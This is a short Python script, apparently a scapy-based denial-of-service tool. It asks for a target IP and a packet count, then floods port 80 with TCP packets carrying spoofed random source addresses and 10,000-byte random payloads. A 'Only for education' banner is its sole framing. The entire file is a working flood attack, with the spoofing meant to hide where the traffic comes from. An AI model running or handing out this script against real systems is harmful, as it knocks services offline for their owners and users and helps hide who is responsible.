from scapy.all import *
import socket
import random
import string
import threading
from scapy.all import *
import socket
import random
import string

print("Created by ArdaZortlatan. Only for education")
target_IP = input("Enter IP address of Target: ")
num_packets = int(input("Enter the number of packets to send: "))

def generate_random_ip():
    ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    return ip

def generate_random_string(length):
    letters = string.ascii_letters
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string

i = 1

while i <= num_packets:
    source_IP = generate_random_ip()
    source_port = random.randint(1, 65535)
    payload = generate_random_string(10000)

    IP1 = IP(src=source_IP, dst=target_IP)
    TCP1 = TCP(sport=source_port, dport=80)
    pkt = IP1 / TCP1 / payload
    send(pkt, inter=0.001, verbose=0)

    print("Packet sent", i)
    i += 1

